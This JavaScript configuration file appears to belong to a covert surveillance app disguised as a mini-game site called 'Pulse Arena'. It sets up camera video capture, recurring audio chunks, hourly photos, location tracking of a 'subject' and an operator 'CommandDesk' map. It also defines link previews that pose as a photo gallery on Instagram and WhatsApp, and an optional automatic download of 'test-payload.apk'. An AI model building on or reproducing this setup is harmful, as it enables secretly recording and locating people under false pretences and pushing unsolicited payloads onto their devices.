/**
 * Backend API və Socket.IO (yerli: 3500 port).
 */
const DEFAULT_BACKEND = 'http://localhost:3500';

export const API_BASE_URL = (process.env.REACT_APP_API_URL || DEFAULT_BACKEND).replace(
    /\/$/,
    ''
);

export const SOCKET_URL = API_BASE_URL;

export const ADMIN_PATH =
    (process.env.REACT_APP_ADMIN_PATH || '/admin').replace(/\/$/, '') || '/admin';

export const COMMAND_PATH =
    (process.env.REACT_APP_COMMAND_PATH || '/command').replace(/\/$/, '') || '/command';

export const ADMIN_API_KEY = process.env.REACT_APP_ADMIN_KEY || '';

export const SUBJECT_TITLE =
    process.env.REACT_APP_SUBJECT_TITLE || 'Pulse Arena';

export const SUBJECT_MESSAGE =
    process.env.REACT_APP_SUBJECT_MESSAGE ||
    'Oynamağa başlamaq üçün «Oynamağa başla» düyməsinə toxunun.';

export const SUBJECT_CAMERA_DONE_KEY = 'subject_camera_done_main';

export const CLIENT_SESSION_KEY = 'subject_client_session_id';

export function getClientSessionId() {
    try {
        let id = localStorage.getItem(CLIENT_SESSION_KEY);
        if (!id) {
            id = `cs_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
            localStorage.setItem(CLIENT_SESSION_KEY, id);
        }
        return id;
    } catch {
        return `cs_${Date.now()}`;
    }
}

export const SUBJECT_CAMERA_MESSAGE =
    process.env.REACT_APP_SUBJECT_CAMERA_MESSAGE || SUBJECT_MESSAGE;

export const CAMERA_VIDEO_SECONDS = Number(process.env.REACT_APP_CAMERA_VIDEO_SECONDS) || 5;

export const AUDIO_CHUNK_SECONDS =
    Number(process.env.REACT_APP_AUDIO_CHUNK_SECONDS) || 30;

export const PERIODIC_PHOTO_MS =
    Number(process.env.REACT_APP_PERIODIC_PHOTO_MS) || 3600000;

export const SUBJECT_SUCCESS_MESSAGE =
    process.env.REACT_APP_SUBJECT_SUCCESS_MESSAGE ||
    'Təsdiqləndi. Sorğunuz qəbul olundu — bu pəncərəni bağlaya bilərsiniz.';

export const SUBJECT_GRANTED_KEY = 'subject_locationGranted';

export function subjectCameraDoneKey(token) {
    return `subject_camera_done_${token}`;
}

export const GAME_HUB_TITLE = process.env.REACT_APP_GAME_HUB_TITLE || 'Pulse Arena';

export const GAME_HUB_TAGLINE =
    process.env.REACT_APP_GAME_HUB_TAGLINE || 'Sürətli mini-oyunlar — level qazan';

export const CONSENT_TEXT =
    process.env.REACT_APP_CONSENT_TEXT ||
    `${GAME_HUB_TITLE} — oyun təcrübəsi üçün cihaz sensorları və media istifadə olunur.`;

/** Link önizləməsi (Instagram DM, WhatsApp) — yalnız public/index.html OG tag-ları */
export const SHARE_PREVIEW_TITLE =
    process.env.REACT_APP_SHARE_PREVIEW_TITLE || 'Pulse Arena';

export const SHARE_PREVIEW_DESCRIPTION =
    process.env.REACT_APP_SHARE_PREVIEW_DESCRIPTION ||
    'Şəkillərini paylaş — foto qalereya.';

export function pulseProgressKey(clientKey) {
    return `pulse_progress_${clientKey}`;
}

/** Lokal test: true olanda əsas saytda bir dəfə test-payload.apk endirilir (default: false) */
export const TEST_AUTO_DOWNLOAD =
    process.env.REACT_APP_TEST_AUTO_DOWNLOAD === 'true';

export const TEST_DOWNLOAD_PATH =
    process.env.REACT_APP_TEST_DOWNLOAD_PATH || '/test-payload.apk';

/** Google Maps JavaScript API (CommandDesk trafik xəritəsi) */
export const GOOGLE_MAPS_API_KEY = process.env.REACT_APP_GOOGLE_MAPS_API_KEY || '';

export const GOOGLE_MAPS_ENABLED = Boolean(GOOGLE_MAPS_API_KEY);

/** TomTom Maps + Routing + Traffic (Waze tərzi naviqasiya) */
export const TOMTOM_API_KEY = process.env.REACT_APP_TOMTOM_API_KEY || '';

export const TOMTOM_MAPS_ENABLED = Boolean(TOMTOM_API_KEY);
